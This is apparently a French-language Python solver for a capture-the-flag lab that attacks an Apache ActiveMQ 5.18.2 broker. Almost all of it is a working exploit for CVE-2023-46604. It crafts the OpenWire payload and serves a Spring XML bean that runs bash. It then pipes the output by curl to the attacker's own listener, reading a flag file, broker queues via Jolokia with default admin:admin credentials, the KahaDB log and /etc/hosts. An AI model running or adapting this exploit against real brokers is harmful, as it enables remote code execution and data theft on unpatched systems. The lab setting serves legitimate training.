#!/usr/bin/env python3
"""Solveur — Opération TERVALIS, challenges 07/08/09 (FBI Valdoria).

Cible : portail de coordination FBI Valdoria + courtier ActiveMQ 5.18.2.

Chaîne :
  Q7 « Silent Broker »   : ActiveMQ OpenWire RCE (CVE-2023-46604) -> /opt/activemq/data/flag.txt
  Q8 « Subject File »    : dossiers SUBJ-7742 persistés dans le KahaDB du courtier
  Q9 « EXFILTRATION »    : ordre judiciaire scellé (SUBJ-7742 / Tims AVALD) dans le KahaDB

Le broker tombe régulièrement après exploitation. Ce solveur :
  - détecte l'indisponibilité du serveur (TCP probe) et attend/re-essaie ;
  - regroupe l'extraction en UN SEUL tir RCE pour limiter les crashs ;
  - affiche tous les jetons EXPURGE trouvés.

Usage :
    python3 solveur.py                  # cible par défaut 172.28.36.3
    python3 solveur.py --host 1.2.3.4
    python3 solveur.py --retries 60 --wait 10
"""

from __future__ import annotations

import argparse
import html
import http.server
import socket
import sys
import threading
import time

DEFAULT_HOST = "172.28.36.3"
OPENWIRE_PORT = 61616
WEB_PORT = 8080
LPORT = 8001


def probe(host: str, port: int, timeout: float = 3.0) -> bool:
    """Test TCP simple : le port répond-il ?"""
    try:
        s = socket.create_connection((host, port), timeout=timeout)
        s.close()
        return True
    except OSError:
        return False


def server_up(host: str) -> bool:
    return probe(host, WEB_PORT) or probe(host, OPENWIRE_PORT)


def wait_until_up(host: str, retries: int, wait: float) -> bool:
    for i in range(retries):
        if server_up(host):
            print(f"[+] serveur joignable : {host}")
            return True
        print(f"[!] serveur injoignable ({host}) — tentative {i + 1}/{retries}, "
              f"attente {wait}s…", file=sys.stderr)
        time.sleep(wait)
    return False


def get_our_ip(host: str) -> str:
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    try:
        s.connect((host, WEB_PORT))
        return s.getsockname()[0]
    except OSError:
        s.close()
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect((host, OPENWIRE_PORT))
        ip = s.getsockname()[0]
        s.close()
        return ip


def _i2h(i: int, n: int) -> str:
    return format(i, "0%dx" % n)


def _s2h(s: str) -> str:
    return s.encode().hex()


def build_payload(cn: str, url: str) -> bytes:
    body = (
        "1f00000000000000000001"
        + "01" + _i2h(len(cn), 4) + _s2h(cn)
        + "01" + _i2h(len(url), 4) + _s2h(url)
    )
    return bytes.fromhex(_i2h(len(body) // 2, 8) + body)


EXTRACT_CMD = (
    "echo '===== FLAG.TXT (Q7) ====='; "
    "cat /opt/activemq/data/flag.txt 2>/dev/null; "
    "echo; echo '===== JOLOKIA : liste des queues ====='; "
    "curl -s -u admin:admin -H 'Origin: http://localhost:8161' "
    "'http://127.0.0.1:8161/api/jolokia/list/"
    "org.apache.activemq:type=Broker,brokerName=localhost,destinationType=Queue,destinationName=*' 2>/dev/null; "
    "echo; echo '===== JOLOKIA : tailles de queues ====='; "
    "curl -s -u admin:admin -H 'Origin: http://localhost:8161' "
    "'http://127.0.0.1:8161/api/jolokia/read/"
    "org.apache.activemq:type=Broker,brokerName=localhost,destinationType=Queue,destinationName=*/"
    "QueueSize,EnqueueCount,DequeueCount' 2>/dev/null | head -c 3000; "
    "echo; echo '===== KAHADB : jetons HLB2026 ====='; "
    "grep -a -o 'EXPURGE]*}' /opt/activemq/data/kahadb/db-1.log 2>/dev/null | sort -u; "
    "echo '===== DNS / LDAP ====='; "
    "getent hosts dc01.valdoria.fbi.lab 2>/dev/null; cat /etc/hosts 2>/dev/null | grep -i dc0; "
    "echo '===== FIN ====='"
)


def rce_once(host: str, our_ip: str, cmd: str, lport: int, timeout: int) -> str | None:
    """Un tir RCE : sert poc.xml, envoie le payload OpenWire, capture l'exfil."""
    full_cmd = "( " + cmd + " ) 2>&1 | curl -s -X POST --data-binary @- "
    full_cmd += "http://%s:%d/exfil" % (our_ip, lport)

    xml = (
        '<beans xmlns="http://www.springframework.org/schema/beans" '
        'xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" '
        'xsi:schemaLocation="http://www.springframework.org/schema/beans '
        'http://www.springframework.org/schema/beans/spring-beans.xsd">'
        '<bean id="pb" class="java.lang.ProcessBuilder" init-method="start">'
        '<constructor-arg><list><value>bash</value><value>-c</value><value>%s</value>'
        '</list></constructor-arg></bean></beans>'
    ) % html.escape(full_cmd)

    captured: list[str] = []
    done = threading.Event()

    class H(http.server.BaseHTTPRequestHandler):
        def do_GET(self):
            if self.path.startswith("/poc.xml"):
                b = xml.encode()
                self.send_response(200)
                self.send_header("Content-Length", str(len(b)))
                self.end_headers()
                self.wfile.write(b)
            else:
                self.send_response(200)
                self.end_headers()

        def do_POST(self):
            n = int(self.headers.get("Content-Length", 0))
            captured.append(self.rfile.read(n).decode("utf-8", "replace"))
            self.send_response(200)
            self.end_headers()
            done.set()

        def log_message(self, *a):
            pass

    try:
        httpd = http.server.HTTPServer(("0.0.0.0", lport), H)
    except OSError:
        return None  # port occupé -> on réessaiera avec un autre port

    threading.Thread(target=httpd.serve_forever, daemon=True).start()

    cn = "org.springframework.context.support.ClassPathXmlApplicationContext"
    url = "http://%s:%d/poc.xml" % (our_ip, lport)
    payload = build_payload(cn, url)

    try:
        c = socket.create_connection((host, OPENWIRE_PORT), timeout=10)
        c.send(payload)
        c.close()
    except OSError:
        httpd.shutdown()
        return None

    # attente de l'exfiltration
    end = time.time() + timeout
    while not done.is_set() and time.time() < end:
        time.sleep(0.3)

    httpd.shutdown()
    return captured[0] if captured else None


def main() -> int:
    ap = argparse.ArgumentParser(description="Solveur FBI Valdoria (07/08/09)")
    ap.add_argument("--host", default=DEFAULT_HOST)
    ap.add_argument("--retries", type=int, default=60, help="nb de sondages d'attente")
    ap.add_argument("--wait", type=int, default=10, help="secondes entre sondages")
    ap.add_argument("--timeout", type=int, default=20, help="timeout d'exfiltration")
    args = ap.parse_args()

    host = args.host
    if not wait_until_up(host, args.retries, args.wait):
        print(f"[x] serveur {host} jamais joignable dans le délai imparti.", file=sys.stderr)
        return 2

    our_ip = get_our_ip(host)
    print(f"[*] IP d'exfiltration : {our_ip}")

    for lport in (LPORT, LPORT + 1, LPORT + 2, LPORT + 3):
        print(f"[*] tir RCE (port {lport}) …")
        out = rce_once(host, our_ip, EXTRACT_CMD, lport, args.timeout)
        if out is None:
            if not server_up(host):
                print("[!] broker retombé après le tir. Re-sondage…", file=sys.stderr)
                if not wait_until_up(host, args.retries, args.wait):
                    return 2
            continue
        print("\n" + out)
        if "HLB2026{" in out:
            return 0
        print("[!] pas de jeton dans cette exfiltration, nouvel essai…", file=sys.stderr)

    print("[x] aucune exfiltration exploitable.", file=sys.stderr)
    return 1


if __name__ == "__main__":
    raise SystemExit(main())
